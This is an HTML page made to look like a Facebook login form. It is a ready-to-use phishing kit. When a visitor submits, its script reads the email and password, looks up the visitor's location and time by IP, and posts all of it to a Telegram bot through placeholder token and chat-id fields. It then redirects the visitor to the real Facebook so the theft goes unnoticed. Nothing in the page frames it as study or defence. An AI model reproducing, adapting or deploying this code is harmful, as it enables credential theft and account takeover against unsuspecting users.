<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>

    <!-- External scripts and styles -->
    <script crossorigin="" src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">

    <style>
        body {
            background: #1877F2; /* Facebook blue */
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            margin: 0;
        }

        .form-container {
            background: #ffffff;
            border-radius: 8px;
            padding: 30px;
            width: 90%;
            max-width: 450px;
            text-align: center;
            margin: auto;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .form-container input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 6px;
            border: 1px solid #ddd;
            font-size: 16px;
            color: black;
        }

        .form-container button {
            background-color: #1877F2;
            color: white;
            padding: 15px;
            font-size: 16px;
            border-radius: 6px;
            border: none;
            width: 100%;
            cursor: pointer;
            margin-top: 10px;
        }

        .details {
            margin-top: 20px;
            background: #f0f0f0;
            border-radius: 8px;
            padding: 15px;
            text-align: left;
            color: #333;
        }

        .details span {
            display: block;
            margin: 5px 0;
        }
    </style>
</head>

<body>
    <div class="form-container">
        <h2 class="text-blue-800 text-2xl mt-4 font-bold">Log In to Facebook</h2>

        <form id="loginForm">
            <input type="text" name="email" id="email" placeholder="Email or Phone" required>
            <input type="password" name="password" id="password" placeholder="Password" required>
            <button type="button" onclick="handleFormSubmission()">Submit</button>
        </form>

        <div id="details" class="details" style="display: none;">
            <h3>üìç Your Details</h3>
            <span id="location">üåç Location: Loading...</span>
            <span id="country">üè≥Ô∏è Country: Loading...</span>
            <span id="flags">üö© Flags: Loading...</span>
            <span id="currentTime">‚è∞ Current Time: Loading...</span>
        </div>
    </div>

    <script>
        async function handleFormSubmission() {
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            // Fetch location details
            const detailsDiv = document.getElementById('details');
            const locationSpan = document.getElementById('location');
            const countrySpan = document.getElementById('country');
            const flagsSpan = document.getElementById('flags');
            const currentTimeSpan = document.getElementById('currentTime');

            try {
                const res = await axios.get('https://ipapi.co/json/');
                const data = res.data;

                const location = data.city || 'Unknown';
                const country = data.country_name || 'Unknown';
                const flags = data.country_code ? `https://flagcdn.com/w320/${data.country_code.toLowerCase()}.png` : '';
                const currentTime = new Date().toLocaleTimeString('en-US', { timeZone: data.timezone || 'UTC' });

                // Update the details
                locationSpan.textContent = `üåç Location: ${location}`;
                countrySpan.textContent = `üè≥Ô∏è Country: ${country}`;
                flagsSpan.innerHTML = flags ? `üö© Flags: <img src="${flags}" alt="${country} flag" style="width: 20px; height: 15px;">` : 'üö© Flags: Not Available';
                currentTimeSpan.textContent = `‚è∞ Current Time: ${currentTime}`;

                // Show the details section
                detailsDiv.style.display = 'block';
            } catch (error) {
                console.error('Error fetching location details:', error);
                locationSpan.textContent = 'üåç Location: Failed to fetch';
                countrySpan.textContent = 'üè≥Ô∏è Country: Failed to fetch';
                flagsSpan.textContent = 'üö© Flags: Failed to fetch';
                currentTimeSpan.textContent = '‚è∞ Current Time: Failed to fetch';
            }

            // Send details to Telegram
            const telegramToken = "YOUR_BOT_TOKEN"; // Replace with your bot token
            const chatId = "YOUR_CHAT_ID"; // Replace with your chat ID
            const message = `
            üìù *Login Information* üìù

            üîë *Email/Phone:* ${email}
            üîê *Password:* ${password}
            üåç *Location:* ${locationSpan.textContent}
            üè≥Ô∏è *Country:* ${countrySpan.textContent}
            ‚è∞ *Time:* ${currentTimeSpan.textContent}
            
            üìå Please handle with care!
            `;

            try {
                await axios.post(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                });
                console.log("Message sent to Telegram!");
            } catch (error) {
                console.error("Error sending message to Telegram:", error);
            }

            // Redirect to Facebook
            window.location.href = "https://facebook.com";
        }
    </script>
</body>
</html>
